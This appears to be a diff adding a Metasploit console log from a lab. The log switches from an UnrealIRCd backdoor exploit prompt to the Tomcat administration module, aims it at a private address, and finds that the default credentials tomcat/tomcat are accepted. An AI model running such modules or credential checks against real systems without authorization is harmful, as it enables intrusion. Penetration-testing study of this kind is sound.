@@ -1,0 +1,25 @@
+msf5 exploit(unix/irc/unreal_ircd_3281_backdoor) > use auxiliary/admin/http/tomcat_administration 
+msf5 auxiliary(admin/http/tomcat_administration) > show options 
+
+Module options (auxiliary/admin/http/tomcat_administration):
+
+   Name         Current Setting  Required  Description
+   ----         ---------------  --------  -----------
+   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS       192.168.1.31     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT        8180             yes       The target port (TCP)
+   SSL          false            no        Negotiate SSL/TLS for outgoing connections
+   THREADS      1                yes       The number of concurrent threads (max one per host)
+   TOMCAT_PASS                   no        The password for the specified username
+   TOMCAT_USER                   no        The username to authenticate as
+   VHOST                         no        HTTP server virtual host
+
+msf5 auxiliary(admin/http/tomcat_administration) > run
+
+[*] http://192.168.1.31:8180/admin [Apache-Coyote/1.1] [Apache Tomcat/5.5] [Tomcat Server Administration] [tomcat/tomcat]
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+
+
+
